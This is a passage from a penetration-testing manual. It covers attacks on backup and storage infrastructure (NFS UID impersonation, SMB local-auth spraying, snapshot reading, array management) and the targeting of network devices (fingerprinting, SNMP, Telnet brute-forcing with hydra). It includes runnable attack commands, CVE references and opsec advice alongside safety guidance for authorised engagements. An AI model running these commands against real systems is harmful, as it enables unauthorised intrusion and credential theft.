```bash
mkdir -p /mnt/nfs
mount -t nfs -o ro,vers=3,nolock $TARGET:/export /mnt/nfs

# Become an arbitrary UID to read files you would otherwise be denied. This is
# the whole of AUTH_SYS authorisation.
id someuser
useradd -u 1001 tempuser && su tempuser -c 'ls -la /mnt/nfs/home/someuser'
```

For a backup repository specifically, an NFS export with no host restriction is a complete compromise of every backup in it.

**Verify it worked.** You can read files whose ownership implies you should not be able to. Confirm by listing a directory owned by a UID other than the one you are acting as.

**Detection and opsec.** NFS servers log mounts, and appliance NAS devices log them in an audit log that is usually shipped nowhere. Read-only mounts are safe. Writing to an NFS export is a real change to a live file system, so mount `ro` unless you have a reason not to.

**Failure modes.** `access denied by server while mounting` means the host restriction excludes you, and there is nothing to do about it from that address. `Permission denied` after a successful mount means root squashing plus per-file ACLs, so switch UIDs. `RPC: Program not registered` means NFS is not actually running behind an open rpcbind. NFSv4 with `sec=krb5` will fail without a Kerberos ticket, which is the correctly configured case.

#### SMB file server appliances

A NAS presenting SMB is a file server with a different management plane. What is distinctive:

- **Local accounts alongside domain integration.** Even a domain-joined filer usually retains local administrative accounts, and those accounts are outside AD's password policy, lockout policy, and logging. They are a spray target that does not appear in AD authentication telemetry.
- **A separate share and export ACL layer.** Filers implement their own share-level permissions in addition to the file system ACLs, and the two are configured by different people at different times. Misalignment produces shares that are more open than intended.
- **Snapshot exposure.** Covered below, and it is the single most useful filer-specific technique.
- **Auditing that is off by default.** File access auditing on a filer is a licensed or performance-costly feature and is very frequently not enabled, so reading a share on a filer is quieter than reading the same share on a Windows file server.

Enumeration is ordinary SMB enumeration, covered in Network Enumeration, with the addition of checking for the appliance's local accounts and its management interface.

```bash
nxc smb $TARGETS -u "$USER" -p "$PASS" --shares --users
# Local authentication against the filer, which bypasses domain policy.
nxc smb $TARGET -u admin -p 'password' --local-auth
```

#### Snapshot access as a route to data

**What it is.** Reading data from a storage array or filer snapshot rather than from the live file system.

**Why it works.** Snapshots are point-in-time copies maintained by the storage layer, and they are exposed to clients through a hidden directory so that users can self-service restores: `~snapshot` for SMB clients on ONTAP, `.snapshot` for NFS, and the Previous Versions tab in Windows Explorer for the SMB case. Crucially, the snapshot is a copy of the file system **as it was**, which means it contains files that have since been deleted, and it may be reachable when the visible path is not, depending on how the share property and the ACLs interact. NetApp exposes control over this through the `showsnapshot` share property: when it is disabled, an SMB 2.x client cannot see or traverse `~snapshot` even by typing the path manually, and when it is enabled, which is the default state for snapshot directory client access, a Windows client can map a drive to it and browse.

The offensive value is threefold. Snapshots hold deleted data, which includes the file someone removed after realising it had credentials in it. Snapshots hold historic versions, which includes the configuration file before the password was rotated. And snapshot access does not touch the live file system at all, so file access auditing on the live path, where it exists, sees nothing.

**Preconditions.** Read access to a share or export on the filer. `showsnapshot` enabled, or NFS snapshot directory access enabled, which are common defaults.

**Commands.**

```bash
# NFS: the snapshot directory is a real directory once you are mounted.
ls -la /mnt/nfs/.snapshot/
ls -la /mnt/nfs/.snapshot/daily.2024-01-01_0010/

# SMB: the tilde directory, browsable from a mounted share.
smbclient "//$TARGET/share" -U "$DOMAIN/$USER%$PASS" -c 'cd ~snapshot; ls'
```

```powershell
# Windows client, mapping the snapshot directory directly.
dir \\$TARGET\share\~snapshot
Get-ChildItem \\$TARGET\share\~snapshot\ -Directory | Select-Object Name, CreationTime
```

From the array's management plane you have more options: create a clone of a volume snapshot and present it as a new share or LUN that you control, which gives you the entire volume including everything ACLs would have denied you. That is a privileged operation and it is a state change, so weigh it against just reading the snapshot directory.

**Verify it worked.** You can read a file in the snapshot path that does not exist in the live path. That is the confirmation and it is also the reportable finding.

**Detection and opsec.** Reading a snapshot directory is a read against the filer, logged only if filer auditing is enabled, which it usually is not. Creating a volume clone is an array configuration change and is logged in the array's event log. Do not delete snapshots. Snapshots are a recovery mechanism and deleting them destroys recovery points, which puts it in the same category as deleting backups.

#### SAN and NAS management interfaces

The array management plane is a privileged position over all data on the array: it can present any LUN to any host, clone any volume, read any snapshot, and change any access control. Getting it is often a matter of default or reused credentials, because these devices are commissioned once by an integrator and then left.

| Platform | Typical management surface |
| --- | --- |
| NetApp ONTAP | HTTPS 443 (System Manager and REST API), SSH 22 (clustershell). Local accounts plus optional AD integration |
| Dell EMC Unity / PowerStore / PowerMax | HTTPS 443 (Unisphere and REST API), SSH 22 |
| Dell EMC Isilon / PowerScale (OneFS) | HTTPS 8080 (web admin), SSH 22 <!-- VERIFY --> |
| Pure Storage FlashArray | HTTPS 443 (Purity GUI and REST API), SSH 22 |
| HPE 3PAR / Primera / Alletra | SSH 22, SSMC on HTTPS. SMI-S on 5988/5989 where enabled |
| HPE Nimble | HTTPS 443, SSH 22 |
| Brocade / Cisco FC switches | SSH 22, HTTPS 443, SNMP 161/udp |
| Generic SMI-S provider | 5988/tcp CIM-XML, 5989/tcp CIM-XML over TLS |
| Generic SLP | 427/tcp and udp, used for storage service discovery |
| iSNS | 3205/tcp, iSCSI name service |
| IPMI / BMC on the storage node | 623/udp, plus a web UI. The out-of-band path into the appliance itself |

```bash
# Storage management sweep. SLP and SMI-S are the two most useful discovery
# protocols and both are frequently forgotten by the people who own the array.
nmap -Pn -sV -p 22,80,111,161,427,443,623,2049,3205,3260,5988,5989,8080,8443 --open -oA storage $TARGETS
nmap -Pn -sU -p 161,427,623 --script snmp-info,ipmi-version -oA storage-udp $TARGETS

# SNMP with a default community string is read access to the array's
# configuration and often its inventory.
snmpwalk -v2c -c public $TARGET
onesixtyone -c community-strings.txt -i $TARGETS
```

Cross-reference the IPMI and BMC material in the network infrastructure device part later in this section. A BMC on a storage node is a full out-of-band console on the array's controller, and IPMI's cipher zero and hash retrieval weaknesses are unpatched by design in older implementations.

Once you have array management access, the read-only enumeration is the safe and productive part.

```bash
# ONTAP clustershell, read-only commands only.
security login show
vserver show
vserver cifs share show
volume show
volume snapshot show
network interface show
```

The last of those is worth doing everywhere: a storage array's interface list tells you every network it is connected to, and storage arrays are connected to networks that hosts are not, which makes the array a pivot as well as a data source.

#### Fibre Channel and the fabric

Where storage is on Fibre Channel rather than iSCSI, you cannot reach the data plane from Ethernet, and that is a genuine control rather than security theatre. What you can reach is the **fabric management plane**: the switch's SSH and web interface on the management network. Fabric administration lets you rezone, and rezoning means presenting a LUN to a host you control, which converts a management position into a data position. It is also a highly disruptive operation if you get it wrong, since a bad zoning change removes storage from production hosts. Enumerate it, report it, and do not change it without explicit agreement.

### Detection and opsec

Backup and storage infrastructure is one of the few areas where a mistake is genuinely destructive, and where the destruction is not recoverable by you or by anyone else. This section is therefore prescriptive rather than descriptive.

#### Safe, careful, and dangerous

| Action | Risk | Notes |
| --- | --- | --- |
| Port and service enumeration | Safe | Ordinary scanning. Avoid aggressive scan rates against storage controllers, which occasionally handle malformed traffic badly |
| LDAP enumeration of backup accounts and groups | Safe | Read-only against the directory |
| Reading backup platform configuration and registry | Safe | No state change |
| Listing jobs, clients, backup sets, restore points, repositories | Safe | Read-only platform API and console operations. Do this first, always |
| Reading the credential store and decrypting offline | Safe to the platform | No state change on the platform. Detection risk from tooling signatures, not operational risk |
| Reading a repository share or NFS export | Safe | Read-only file access |
| iSCSI discovery | Safe | No session established |
| iSCSI login, read-only mount | Careful | Corruption risk if you mount read-write or attach with a Windows initiator. Mount `ro` and log out cleanly |
| Reading snapshot directories | Safe | No state change |
| Restore to an alternate location, item-level or file-level | Careful | The correct form of restore. Consumes capacity and I/O on the repository and the mount server. Check free space at the destination |
| Restore to an alternate location, full VM or full volume | Careful | Same, at much larger scale. Can fill a datastore or saturate the backup network. Agree scale in advance |
| Instant recovery / boot a VM from backup | Careful | Consumes repository I/O and creates a running machine. Ensure it lands on an isolated network and that it cannot rejoin the domain or conflict with the live VM's identity |
| Creating a new job with a pre-job script | Careful | A configuration change. Log the original state, revert afterwards, keep the job's data selection empty |
| Modifying an existing production job | Dangerous | Risks failing a production backup, which is an alert and a real gap in recovery. Avoid. If unavoidable, record the original configuration exactly |
| Volume clone from a snapshot on an array | Careful | Array configuration change, consumes capacity, logged |
| Fabric rezoning | Dangerous | Can remove storage from production hosts |
| Restore in place / overwrite original | Do not | Overwrites live production data with an older copy. Not reversible. There is no engagement objective that requires this |
| Deleting backup sets or restore points | Do not | Destroys recovery capability |
| Modifying retention or immutability settings | Do not | Can silently expire recovery points. The damage may not be visible for weeks |
| Deleting storage snapshots | Do not | Destroys recovery points |
| Triggering a large job or a tape restore without agreement | Do not | Consumes capacity, drives, and off-site recall processes. Highly visible and operationally disruptive |
| Encrypting or re-keying backups | Do not | Indistinguishable from ransomware and can render backups unrecoverable |

**The single rule: restore to an alternate location is the safe form, restore in place is not.** Every product's restore wizard offers both and the destructive one is sometimes the default. Read the confirmation dialogue. Every time.

**Anything touching retention, deletion, or immutability must be agreed with the client before you do it,** because it can destroy the organisation's ability to recover from an unrelated incident that happens next week. Demonstrating that you *could* delete every backup does not require deleting any backups. Demonstrating that you hold the credentials and the console rights to do so is the finding, and it is a stronger finding than a destroyed repository because it does not come with an incident report attached. Where a client specifically wants deletion capability proven, agree a single expendable test backup set, in writing, and prove it against that.

#### What the platform logs, and what actually gets looked at

Backup platforms log thoroughly and the logs are almost never monitored. This is the central opsec fact of the whole section. Concretely, the artefacts you generate:

- **Console and API logins**, with source address and account. Logged by every product. Reviewed when someone is investigating something else.
- **Job configuration changes**, with the operator identity, the old value and the new value in the better products.
- **Restore jobs**, with source, destination, size and operator. This is the record of what you took, and it is the one a competent incident responder will find immediately.
- **Job success and failure**, which is the only category that is reliably alerted on, because failed backups are an operational issue with a named owner.
- **Repository capacity**, which is monitored because filling it breaks backups. A large restore that consumes destination capacity can trip a capacity alert.

Derived from that, the practical guidance: do not fail jobs, do not fill volumes, and prefer read operations, in that order. A backup administrator who receives a job failure alert at 03:00 will read the logs around that failure, and your configuration change will be in them.

On the endpoint side, the detections that do exist and do fire:

| Artefact | Where it shows |
| --- | --- |
| `sqlcmd.exe` or `psql.exe` with a credential query on the command line | 4688 with command line auditing, and every EDR product |
| Known credential-dumping assemblies loaded in a process | AMSI for the managed ones, EDR memory scanning, ETW CLR provider |
| A child process of the backup service that is not a backup binary | High-quality EDR detection, shipped by several vendors, precisely because ransomware uses it |
| A child process of `bpcd` or the guest agent, running a script from a temporary path | Same, on the client side |
| Writes to the backup product's binary directory | File integrity monitoring, if present |
| A new local mount of a production LUN or NFS export | Almost never detected, but visible on the array's own log |

Cross-reference the Evasion and Payload Development section for handling the managed-assembly signatures. The detection theory material there is the right frame for deciding which of these you can afford.

#### Impact framing for the report

The findings from this area are among the most compelling you can write, because they are simultaneously severe, easy for a non-technical reader to understand, and hard to argue with. Some framings that land:

**"We recovered every credential in the domain, including the `krbtgt` key, from your backup repository, without touching a domain controller."** This is the strongest sentence in the report because it defeats every control the reader has invested in. It says the Credential Guard rollout, the tiered administration model, the EDR deployment, and the DCSync alerting were all bypassed by a supported feature of a product they already own. It also frames the remediation correctly, which is that domain controller backups are tier-zero assets and must be protected as such.

**"The backup service account is a local administrator on every server in the estate and its password was recoverable from the backup server in under a minute."** This reframes a single-host compromise as a whole-estate compromise, and it makes the case for constrained backup service accounts, hardened repositories, and separated management planes.

**"Your immutable backups protected you from ransomware and did nothing to protect the data in them, which we read in full."** This is the finding that mature organisations do not expect, because they have invested specifically in this area and been told it was solved. Being precise about what immutability does and does not do is the value you are adding.

**"Backup infrastructure and Active Directory are mutually dependent: the backup platform authenticates administrators against the domain, and the domain can be fully recovered from the backup platform. Compromise of either is compromise of both."** This is an architectural finding rather than a technical one and it usually drives more remediation than any individual technique, because it cannot be patched.

**"An unauthenticated host on the storage network could mount a datastore containing every production virtual machine."** For iSCSI and NFS findings, the impact is best stated in terms of what the storage contains rather than the protocol weakness, because "iSCSI target permits unauthenticated login" reads as low severity and "any host on this VLAN can read every server's disk" does not.

For each finding, state what was not required as well as what was. The absence of exploitation is the point: no vulnerability was exploited, no malware was used, no control was evaded, and the outcome was total. That is what makes backup findings difficult to deprioritise.

### Summary

| Component | What you need to get in | What you recover | Risk of the action |
| --- | --- | --- | --- |
| Veeam Backup & Replication | Local admin or SYSTEM on the backup server; or unpatched CVE-2023-27532 / 2024-40711 / 2025-23120 | Every stored credential: domain accounts, vCenter, guest OS, Linux root, cloud keys, repository credentials | Safe (read and offline decrypt) |
| Veeam Backup Enterprise Manager | Web session on 9443, or CVE-2024-29849 auth bypass | Self-service file and item-level restore across all managed backup servers; credentials for each backup server | Safe to enumerate, careful to restore |
| Veeam ONE | Local admin on the Veeam ONE server, or read on its database | vCenter and guest credentials; pre-11.0.1 builds are offline-crackable | Safe |
| Commvault CommServe | Local admin on the CommServe, or a `CommServ` SQL login; or CVE-2025-34028 pre-auth on Command Center | Client inventory, job configuration, credential store, full CommCell administration | Safe to enumerate, careful to restore |
| Veritas NetBackup | Root on the primary server, or reach to `bpcd` with legacy trust | Policy and client inventory, catalogue, restore of anything backed up, root execution on clients | Safe to enumerate; careful for `bpcd` execution |
| NetBackup client notify scripts | Write access to the client's NetBackup `bin` directory | Root or SYSTEM execution on that client at every backup, persistently | Careful; remove the file afterwards |
| Veritas Backup Exec agent | Network reach to 10000/tcp on an unpatched agent | Unauthenticated code execution as SYSTEM or root | Careful; can destabilise the agent |
| Bacula / Bareos | Read access to `/etc/bacula` or `/etc/bareos` | Cleartext daemon secrets, therefore Director and File Daemon control | Safe |
| Rubrik / Cohesity / appliance platforms | AD-integrated administrator account, or an API credential | API-driven enumeration and restore of everything protected | Safe to enumerate, careful to restore |
| Domain controller backup | Restore rights on any platform holding a DC backup | `ntds.dit` plus `SYSTEM`, therefore every domain credential and `krbtgt`, offline | Careful (alternate location only) |
| Pre-job / post-job script | Rights to create or edit a job | Code execution as the backup service account on the backup server | Careful; new empty job preferred over editing a live one |
| Pre-freeze / post-thaw script | Rights to edit guest processing on a job | Code execution inside a protected guest as the stored guest credential | Careful; set ignore-failure and keep it fast |
| Repository share (SMB / NFS) | Read access to the share or export | Raw backup files. Complete dataset if per-job encryption is off, which is the default | Safe to read |
| Object storage backup target | Access key from the backup server's credential store | Every backup, readable from anywhere; a foothold in the cloud tenant | Safe to read; enumerate the key's permissions first |
| Deduplication appliance | Default or reused credentials on SSH / HTTPS, or credentials from the backup server | All backup data on the appliance, plus the ability to destroy it | Safe to enumerate |
| Hardened / immutable repository | Root on the repository host, obtained independently of the backup server | Read access regardless of immutability; write only if you defeat the immutable attribute | Safe to read; do not remove immutability |
| Tape in the library | Restore rights on the platform | Long-retention data, including data deleted from the live estate years ago | Careful; slow, visible, occupies a drive |
| iSCSI target | TCP 3260 and either no CHAP or a satisfiable IQN ACL | Raw block device: file systems, VMFS datastores, whole VM disks | Careful; read-only mount, never a Windows initiator |
| NFS export | Reach to 2049 and a permissive host restriction | Full file system access, arbitrary UID impersonation under `AUTH_SYS` | Safe to read |
| Storage array snapshot | Read access to a share or export with snapshot access enabled | Deleted files, historic versions, data without touching the live path | Safe |
| Storage array management | Default or reused credentials, or SNMP with a default community | Present any LUN to any host, clone any volume, read any snapshot, map the array's networks | Safe to enumerate; changes are dangerous |
| Fibre Channel fabric | Management network access to the switch | Rezoning, therefore presenting production LUNs to a host you control | Dangerous; enumerate and report only |


## Network Infrastructure Devices as Targets

Switches, routers, firewalls, load balancers, VPN concentrators, wireless controllers and out-of-band management processors are the least tested and most consequential systems in most estates. This section treats them as targets in their own right. The layer 2 protocol attacks that run *across* these devices, ARP, LLMNR, DHCP, IPv6, STP, VLAN hopping, CDP and LLDP, and the first-hop redundancy protocols, are in the On-Path and Traffic Attacks section. Enumeration of the management services, including the SNMP fundamentals, is in the Network Enumeration section. What follows is the compromise of the devices themselves.

Several local placeholders are used throughout in addition to the standard set: `$COMMUNITY` is an SNMP community string, `$SNMPUSER`, `$AUTHPASS` and `$PRIVPASS` are SNMPv3 credentials, and `$SHARED_SECRET` is a TACACS+ or RADIUS shared secret.

### Why network devices matter on an engagement

**They are the segmentation control you were hired to test.** Almost every internal engagement scope contains a sentence about validating segmentation: that the card data environment is isolated, that the OT network is separated from corporate, that the guest wireless cannot reach production, that the DMZ is contained. Segmentation is not a property of the network, it is a set of lines in a small number of configuration files on a small number of devices. If you can read those files, you can state authoritatively where the boundaries actually are rather than inferring them from a scan, and you will routinely find that the boundary the organisation believes in does not exist, exists only in one direction, exists with a permit-any rule appended for a project that finished in 2019, or is bypassed entirely by a management VLAN that touches everything. If you can write those files, segmentation is whatever you say it is. Testing segmentation from the outside by scanning across a boundary tells you what is filtered today from where you are standing. Reading the access control list tells you what is filtered from everywhere, why, and what the exceptions are.

**They hold the credentials for the systems that manage them.** A switch configuration is not just a switch configuration. It contains the SNMP community strings the monitoring platform uses, the shared secret the device uses to talk to the RADIUS or TACACS+ server, the credentials the device uses to fetch its own configuration backups from a TFTP or SCP server, the syslog and NetFlow collector addresses, the NTP servers, and often the credentials for the configuration management platform. Every one of those is a pointer to a management system, and management systems are, almost by definition, systems with credentials for many other things. The path from a read-only community string on an access switch to administrative access on the network management platform to administrative access on every device in the estate is short and it is walked on real engagements.

**They can be reconfigured to grant you access you did not have.** This is the difference between a network device and almost any other target. Compromising a file server gets you the files on that server. Compromising a core switch gets you the ability to place yourself anywhere on the network, to see traffic you were never able to see, to route into segments that were unreachable, and to remove the controls that were stopping you. A device with administrative access is not a host you have owned, it is a change in the topology of the engagement. A mirror session configured on a distribution switch delivers you the traffic of an entire server VLAN with no on-path attack, no ARP manipulation, and no forwarding burden. That is a categorically better position than anything you can achieve from a laptop on an access port.

**They sit outside the patching and monitoring programmes.** Vulnerability management programmes are built around operating system patching, and they are usually built around agents. Network devices have no agent. Patching them requires a maintenance window, a change request, a rollback plan, and an engineer who is confident the device will come back up, so it happens on a cadence measured in years rather than weeks. Endpoint detection does not run on them. The SIEM often ingests their syslog but nobody has written detections against it beyond interface up and down. Firmware inventories are frequently maintained in a spreadsheet that has drifted from reality. The practical consequence is that a device class which is critical, internet-facing in the case of edge firewalls, and running a complex proprietary software stack, is also the class with the longest mean time to patch and the thinnest telemetry in the entire estate. That combination is why edge appliances have been the initial access vector of choice for both criminal and state-aligned intrusion sets for several years running.

**The configuration file is a map of the entire network.** Nothing else you can obtain on an engagement gives you the same density of intelligence per byte. A core router configuration gives you every VLAN and its purpose from the interface descriptions, every subnet, every routing peer and therefore every other site, every static route and therefore every appliance that needed special treatment, the access control lists and therefore the organisation's own model of what is sensitive, the management addresses of every platform that touches the device, and the naming convention for everything. Interface descriptions alone are a documentation set: `description PCI-DSS-CDE-Uplink` and `description Link to DR site Colo B` and `description SCADA HMI do not shut` tell you where to go next more reliably than any amount of scanning. You should read configurations early for this reason alone, before you have any intention of changing anything.

**They usually authenticate against one central system, so one compromise yields all of them.** Nobody administers three hundred switches with three hundred local passwords. They authenticate to a TACACS+ or RADIUS server, typically Cisco ISE, Aruba ClearPass, Windows NPS, or FreeRADIUS, which in turn usually authenticates against Active Directory. This is the single most important structural fact about network device administration and it cuts both ways. It means guessing local credentials on individual devices is often a waste of time, because the local account is a break-glass credential that may be unique per device. It also means that the network administrators' Active Directory group is functionally equivalent to administrative access on every network device in the organisation, that a compromise of the TACACS+ or RADIUS server yields the whole fleet at once, and that the shared secret configured on every device is a single value that appears in every configuration file you extract. Get one configuration and you have the shared secret. Get the shared secret and you can impersonate the authentication server, or decrypt its traffic, or stand up your own. The centralisation that makes the estate manageable makes it collapse to a single point.

### The access ladder

Work up this ladder deliberately. Each rung is cheap, low-risk and informative, and each one increases the chance of the next.

| Rung | What you have | Typical route | What it yields |
| --- | --- | --- | --- |
| 0 | Nothing | Port scan, banner | Device class, vendor, firmware generation, patch exposure |
| 1 | Unauthenticated read | SNMP read community, TFTP, CDP or LLDP, exposed API | Topology, ARP and route tables, interface inventory |
| 2 | Credentials | Default credentials, reuse, config mining, cracked hash | Interactive CLI, full configuration read |
| 3 | Configuration | Any of the above, or SNMP write, or TFTP archive | Every secret on the device, plus the fleet's shared secrets |
| 4 | Fleet | Centralised authentication compromise, management platform | Every device simultaneously |
| 5 | Reconfiguration | Rung 2 or above plus a change window | Traffic capture, routing, segmentation removal, persistence |

Rungs 0 to 3 are read operations and carry essentially no disruption risk. Rung 5 is the only one that can take a site offline, and it is the only one that requires an explicit conversation before you do it. Treat that boundary as hard.

## Discovery and Fingerprinting

### Identifying device class from the port profile

Network devices have a distinctive and small port profile, and the combination is more diagnostic than any single port. Hosts run many services; network devices run a management plane and a control plane and nothing else. The heuristics below are reliable in practice.

A host answering on 22 and 23 and 161 and nothing else is a network device or an appliance, and the presence of Telnet alongside SSH means the device is either old or has never had its default management configuration reviewed. A host answering on 80 and 443 with no other TCP service and a UDP 161 response is an appliance web interface. A host with 179 open is a router running BGP, which makes it an edge or core device rather than an access switch. A host with 500 and 4500 UDP open is an IPsec VPN gateway. A host with 623 UDP and 443 and nothing that looks like an operating system is a baseboard management controller. A host with 49 TCP open is a TACACS+ server, which is to say it is the device that authenticates every other device.

The absence of ports is as informative as their presence. No 135, no 139, no 445 and no 3389 rules out Windows. No 111 and no typical Unix service set, combined with a stripped-down SSH implementation, points at an embedded stack rather than a general-purpose Linux host even when the SSH banner claims OpenSSH, because most vendor appliances ship a real OpenSSH on a real Linux underneath a restricted CLI.

### Management protocols and their ports

| Port | Protocol | Where you see it | Why you care |
| --- | --- | --- | --- |
| 21/tcp | FTP | Config archive servers, older devices | Anonymous access to a config archive is a fleet compromise |
| 22/tcp | SSH | Everything current | Primary management path. Version and algorithm set fingerprints firmware age |
| 23/tcp | Telnet | Switches, routers, console servers, printers, UPS, PDUs, KVMs, older firewalls | Cleartext credentials, no host key, trivially captured on-path |
| 49/tcp | TACACS+ | The device administration authentication server | Compromise yields administrative access to the whole fleet |
| 69/udp | TFTP | Config and firmware distribution, phone provisioning | Unauthenticated read and often write of configuration files |
| 80, 443/tcp | HTTP and HTTPS management | Almost every device class | Default credentials, auth bypasses, the richest attack surface on modern appliances |
| 161/udp | SNMP | Everything | Read gives topology and state, write gives configuration extraction and modification |
| 162/udp | SNMP traps | Trap receivers, network management platforms | Identifies the monitoring platform |
| 179/tcp | BGP | Routers and edge devices | Identifies a routing device; session hijack and route injection where reachable |
| 500, 4500/udp | IKE and IKE NAT-T | VPN gateways | Vendor fingerprint, aggressive mode PSK exposure on legacy configurations |
| 514/udp | Syslog | Log collectors | Identifies where device logs go, which tells you what a defender can see |
| 623/udp | IPMI RMCP | Server BMCs, some appliances | Pre-auth password hash disclosure, cipher zero bypass |
| 664/udp | Secure RMCP | Some BMCs | Same class of target <!-- VERIFY: 664/udp is IANA asf-secure-rmcp; confirm it is actually bound on the BMCs you meet -->
| 830/tcp | NETCONF over SSH | Modern switches, routers, firewalls | Full programmatic configuration read and write with device credentials |
| 1812, 1813/udp | RADIUS auth and accounting | NPS, ISE, ClearPass, FreeRADIUS | The authentication server for wireless, 802.1X and often device admin |
| 1645, 1646/udp | Legacy RADIUS | Older configurations | Same, on the pre-standard ports |
| 3978/tcp | Panorama device management | Palo Alto Panorama and managed firewalls | The management platform for a firewall estate |
| 541/tcp | FortiManager FGFM | FortiGate and FortiManager | The management platform for a Fortinet estate |
| 4343/tcp | ArubaOS controller web UI | Aruba wireless controllers | Controller administration |
| 4786/tcp | Cisco Smart Install | Older Catalyst switches | Unauthenticated configuration read and write where present |
| 5246, 5247/udp | CAPWAP control and data | Cisco and other wireless controllers and APs | Identifies a wireless controller and its AP population |
| 8211/udp | Aruba PAPI | Aruba controllers and APs | Controller to AP control channel |
| 8291/tcp | MikroTik WinBox | MikroTik RouterOS | Proprietary management protocol, historically a rich vulnerability surface |
| 8728, 8729/tcp | MikroTik API and API-SSL | MikroTik RouterOS | Programmatic administration |
| 8443, 10443/tcp | Alternate HTTPS management, SSL VPN | FortiGate, many appliances | Admin UI or SSL VPN portal, frequently the same daemon |
| 5900/tcp | VNC | iDRAC and other BMC virtual consoles | Console access to the host, sometimes weakly authenticated |

Two notes on this table. First, the RADIUS, TACACS+ and syslog entries are servers rather than network devices, but they appear in every device configuration you extract, so a scan that finds them tells you where to point the configuration intelligence you are about to gather. Second, HTTPS management on a non-standard high port is the single most common way an administrative interface ends up exposed where nobody expected it, so enumerate the full TCP range on at least a sample of device addresses rather than trusting a top-1000 sweep.

### Banners and fingerprint sources

Every one of these is passive or near-passive and none of them requires credentials.

```bash
# Telnet banners name the model and often the software train verbatim.
nmap -sV -p 21,22,23,80,443,830,8291,8443,10443 -iL $TARGETS -oA nmap/devices

# The SSH host key algorithm and cipher list is a firmware-age fingerprint.
ssh-audit $TARGET
nmap -p22 --script ssh2-enum-algos,ssh-hostkey $TARGET

# Web management: title and default credential check in one pass.
nmap -p 80,443,8080,8443,10443 --script http-title,http-default-accounts -iL $TARGETS

# TLS certificate subject and issuer on an appliance is usually the hostname
# and often the model, because the self-signed default certificate says so.
openssl s_client -connect $TARGET:443 -servername $TARGET </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates

# SNMP sysDescr is the single richest one-line fingerprint available.
snmpget -v2c -c public -Oqv $TARGET 1.3.6.1.2.1.1.1.0
```

`sysDescr` on a Cisco device returns the full software train, image name, build date and platform. On a Juniper device it returns the model and Junos version. On a printer it returns the model and firmware. This one OID answers "what is this and how old is it" better than a version scan, and it does so over UDP with no session and no log entry on most devices. It is the reason SNMP read access is worth chasing even when you have no intention of doing anything else with it.

The other passive sources are covered elsewhere and worth pulling in here. CDP and LLDP frames, discussed in the On-Path and Traffic Attacks section, contain the neighbouring device's hostname, platform, software version, native VLAN and management address, and they arrive at your access port unprompted every sixty seconds. A single captured CDP frame frequently identifies the upstream switch model, its software version and its management IP, which is your first target. The ARP and routing tables retrievable over SNMP read give you host and subnet inventory for segments you cannot reach.

### Distinguishing managed enterprise kit from an appliance or consumer device

This distinction determines your entire approach, so make it early.

A **managed enterprise device** has a real command line with a configuration you can display in full, a privilege model with an enable or exec level, support for centralised authentication, a syslog and SNMP configuration pointing at real infrastructure, and structured interface descriptions. Signs: a `sysDescr` naming a vendor network operating system such as Cisco IOS, IOS-XE, NX-OS, IOS-XR, Junos, ArubaOS, FortiOS, PAN-OS, or Arista EOS; SSH present and Telnet either absent or restricted; a TACACS+ or RADIUS configuration; management confined to a dedicated VLAN. Against this class, the plan is credentials and configuration, not exploitation, and the centralised authentication server is the real objective.

An **appliance** is a Linux system with a vendor web interface bolted on and a restricted shell. Signs: HTTPS management with a modern web application, a REST API, a self-signed certificate naming the product, an OpenSSH banner, and frequently no SNMP at all. Against this class, the plan is the web application and the API. Appliances are where the authentication bypasses and command injections live, because the vendor wrote a web application under commercial time pressure and it is parsing untrusted input in a language that shells out. This category includes almost all VPN concentrators, most modern firewalls' management planes, load balancers, and every piece of infrastructure management software.

A **consumer or small-business device** has a single administrative account, no centralised authentication, a web interface with no CSRF protection, firmware that has not been updated since manufacture, and UPnP enabled. Signs: a `sysDescr` naming a chipset or a generic build string, HTTP management without HTTPS, and a vendor you would recognise from a retail shelf. These appear in enterprise networks in branch offices, in test labs that were never decommissioned, under desks as unauthorised switches, and as the actual internet edge of small sites. They are trivially compromised and they are frequently in a position that matters, which is a combination worth checking for rather than dismissing.

Two further categories worth naming because they are constantly misclassified. **Printers and multifunction devices** answer on 161, 515, 631 and 9100 and hold LDAP bind credentials in their address book configuration; they are covered in the Network Enumeration section. **Environmental and power devices**, meaning UPS management cards, PDUs, cooling controllers and building management gateways, present as ancient embedded web servers with default credentials, sit on the management network, and can turn off the power to a rack. Enumerate them, note them, and be extremely careful what you send them.

## Management Protocol Attacks

### Telnet

**What it is.** Unencrypted remote administration on TCP 23, still bound on a substantial fraction of production network devices.

**Why it works and why it persists.** Telnet transmits the username, the password, the enable password and every subsequent command in plaintext. It has no host authentication, so there is nothing to warn a user that they are talking to the wrong device. It persists because disabling it requires touching every device in a fleet, because a generation of network engineers' scripts and terminal server configurations assume it, because out-of-band console servers frequently only speak Telnet on their network side, and because the device that most needs it removed is the device nobody wants to log into to make a change. You will find it on access switches, on console and terminal servers, on printers, on UPS management cards, on PDUs, on KVM switches, and on the management interfaces of older firewalls. In an estate that has genuinely eliminated Telnet from its routers and switches, it is still usually alive on the environmental and out-of-band kit.

**What it yields.** Two distinct things. If you have credentials, an interactive session. If you have an on-path position, credentials for free, and unlike almost everything else on a modern network there is no TLS to strip and no signing to defeat. This is one of the few remaining cases where the classic on-path credential harvest still pays, and it is worth explicitly watching for TCP 23 in a capture even when you are not otherwise interested in cleartext.

**Preconditions.** TCP 23 reachable, which usually means you are inside the management VLAN or the device's management access list is absent or permissive.

```bash
# Grab the banner. On network devices it frequently names the model,
# the software version, and occasionally the site or the on-call number.
nc -nv $TARGET 23
nmap -sV -p23 --script telnet-ntlm-info,banner $TARGET

# Credential testing. Keep the rate low: many devices have a fixed number
# of VTY lines and exhausting them locks out real administrators.
hydra -L users.txt -P passwords.txt -t 1 -f telnet://$TARGET
```

**Verify it worked.** A device prompt. On Cisco IOS a `>` is user exec and a `#` is privileged exec; landing on `>` means you still need the enable secret, and `enable` followed by the same password is worth one attempt because password reuse between the line password and the enable secret is common. On Junos you land in the operational mode `>` prompt and `configure` moves you to configuration mode.

